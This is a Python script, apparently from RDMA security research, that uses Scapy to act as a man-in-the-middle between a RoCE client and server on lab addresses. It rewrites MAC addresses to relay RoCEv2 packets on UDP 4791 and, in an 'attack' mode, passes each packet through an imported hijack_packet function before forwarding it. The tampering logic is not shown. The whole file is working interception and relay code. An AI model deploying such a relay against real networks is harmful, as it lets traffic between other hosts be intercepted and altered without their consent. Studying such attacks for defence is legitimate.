#!/usr/bin/python

import os, sys, binascii
from bitarray import bitarray
from scapy.all import *
from hijack import hijack_packet

VERBOSE = False

client_ip = "10.0.0.17"
server_ip = "10.0.0.15"

client_real_mac = "ec:0d:9a:68:21:bc"
server_real_mac = "ec:0d:9a:68:21:d0"
client_facing_mac = "00:02:c9:45:25:b0"
server_facing_mac = "00:02:c9:45:25:b1"

client_facing_iface = "enp1s0"
server_facing_iface = "enp1s0d1"

if os.getuid() !=0:
    print """
ERROR: This script requires root privileges. 
       Use 'sudo' to run it.
"""
    quit()

if len(sys.argv) < 2:
    print >> sys.stderr, "Usage: %s iface [attack]" % sys.argv[0]
    quit()
else:
    iface = sys.argv[1]

ATTACK_MODE = False
if len(sys.argv) >= 3 and sys.argv[2] == "attack":
    print >> sys.stderr, "Attack mode enabled."
    ATTACK_MODE = True

def handle_pkt(pkt):
    if not(UDP in pkt and pkt[UDP].dport == 4791):
        if VERBOSE:
            print >> sys.stderr, "Received non-RoCE packet!"
            print pkt.show()
        return
    if pkt[Ether].src == client_real_mac and pkt[Ether].dst == client_facing_mac:
        pkt[Ether].src = server_facing_mac
        pkt[Ether].dst = server_real_mac
        out_iface = server_facing_iface
    elif pkt[Ether].src == server_real_mac and pkt[Ether].dst == server_facing_mac:
        pkt[Ether].src = client_facing_mac
        pkt[Ether].dst = client_real_mac
        out_iface = client_facing_iface
    elif pkt[Ether].src == client_facing_mac or pkt[Ether].src == server_facing_mac:
        # Outgoing packet
        if VERBOSE:
            print >> sys.stderr, "Outgoing packet"
        return
    else:
        print >> sys.stderr, "Received packet with unrecognized MAC addresses"
        print >> sys.stderr, "Ether.src = %s, Ether.dst = %s" % (pkt[Ether].src, pkt[Ether].dst)
        return
    if VERBOSE:
        src = pkt[IP].src
        dst = pkt[IP].dst
        payload = bitarray()
        payload.frombytes(str(pkt[UDP].payload))
        opcode = int(payload[0:8].to01(), 2)
        print "%s -> %s, opcode: %d, udp len = %d" % (src, dst, opcode, len(pkt[UDP].payload))
#    print "======== start of packet ========"
#    print pkt.show()
#    print "======== end of packet ========"
    if ATTACK_MODE:
        pkt = hijack_packet(pkt)
    print >> sys.stderr, "packet sent:", binascii.hexlify(raw(pkt))
    sendp(pkt, iface=out_iface, verbose=False)

print "Sniffing on ", iface
print "Press Ctrl-C to stop..."
#sniff(iface = iface, filter = 'udp', prn = lambda x: handle_pkt(x))
sniff(iface = iface, prn = lambda x: handle_pkt(x))

